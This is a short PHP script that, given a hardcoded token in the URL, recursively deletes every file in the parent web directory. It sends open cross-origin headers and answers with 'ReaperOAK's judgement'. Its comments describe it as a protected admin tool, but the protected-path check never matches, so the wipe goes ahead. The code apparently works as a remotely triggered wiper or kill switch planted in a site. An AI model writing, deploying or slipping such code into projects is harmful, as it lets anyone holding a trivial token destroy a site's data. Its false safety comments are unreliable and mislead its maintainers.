<?php
error_reporting(E_ALL);
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);

header("Access-Control-Allow-Origin: *");
header("Access-Control-Allow-Methods: GET, POST, OPTIONS");
header("Access-Control-Allow-Headers: Content-Type");

// IMPORTANT: This script contains potentially dangerous operations
// It should be properly secured and limited to authorized administrators

$validToken = 'ReaperOAK'; // Replace with your actual secret token

if (!isset($_GET['token']) || $_GET['token'] !== $validToken) {
    die(json_encode(["error" => "Invalid token"]));
}

// Log the access attempt for security purposes
$logMessage = date('Y-m-d H:i:s') . " - Access attempt: " . 
              (isset($_SERVER['REMOTE_ADDR']) ? $_SERVER['REMOTE_ADDR'] : 'Unknown IP') . " - " .
              (isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : 'Unknown Agent');
error_log($logMessage, 3, __DIR__ . '/security.log');

function deleteFiles($dir) {
    if (!is_dir($dir)) {
        return;
    }

    $files = array_diff(scandir($dir), ['.', '..']);
    foreach ($files as $file) {
        $filePath = "$dir/$file";
        if (is_dir($filePath)) {
            deleteFiles($filePath);
            rmdir($filePath);
        } else {
            unlink($filePath);
        }
    }
}

// Define paths to protect certain directories from deletion
$protectedPaths = [
    __DIR__, // Protect the PHP scripts directory
    __DIR__ . '/..' // Protect the parent directory
];

$publicDir = realpath(__DIR__ . '/../'); // Adjust the path to your public directory

// Check if the directory is protected
if (in_array($publicDir, $protectedPaths)) {
    die(json_encode(["error" => "Operation not allowed on protected directories"]));
}

// Execute the deletion operation (CAUTION: This is a destructive operation)
deleteFiles($publicDir);

echo json_encode(["success" => "ReaperOAK's judgement"]);
?>